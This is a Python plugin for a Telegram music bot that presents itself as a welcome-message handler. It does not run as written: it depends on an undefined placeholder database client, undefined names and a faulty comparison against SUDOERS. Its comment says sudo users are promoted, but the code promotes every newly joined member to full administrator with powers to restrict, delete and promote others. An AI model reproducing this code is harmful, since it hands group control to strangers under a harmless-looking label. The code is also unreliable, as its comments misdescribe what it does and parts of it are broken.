import random
from VIPMUSIC import app, userbot
from VIPMUSIC.misc import SUDOERS
from pyrogram import * 
from pyrogram.types import *
from VIPMUSIC.utils.vip_ban import admin_filter
from VIPMUSIC.misc import SUDOERS

# Assuming `wlcm` is an instance of a database client
# Make sure to define it properly based on your database setup
wlcm = YourDatabaseClient()

@app.on_chat_member_updated(filters.group, group=-5)
async def greet_new_member(_, member: ChatMemberUpdated):
    chat_id = member.chat.id
    A = await wlcm.find_one(chat_id)
    if A:
        return

    user = member.new_chat_member.user

    if user.id == SUDOERS:
        # Add your welcome message and logic for SUDOERS here
        return

    # Add the modified condition here
    if member.new_chat_member and not member.old_chat_member:
        try:
            # Promote SUDOERS if not already promoted
            await app.promote_chat_member(chat_id, user.id, privileges=ChatPrivileges(
                    can_change_info=True,
                    can_invite_users=True,
                    can_delete_messages=True,
                    can_restrict_members=True,
                    can_pin_messages=True,
                    can_promote_members=True,
                    can_manage_chat=True,
                    can_manage_video_chats=True,
                       )
                     )
            await app.send_message(chat_id, f"ᴡᴇʟᴄᴏᴍᴇ, {user.mention} ʙᴏss😊")
        except ChatAdminRequired:
            LOGGER.error("Bot should be admin to promote members.")
        except Exception as e:
            LOGGER.error(f"Error promoting member: {e}")            
                
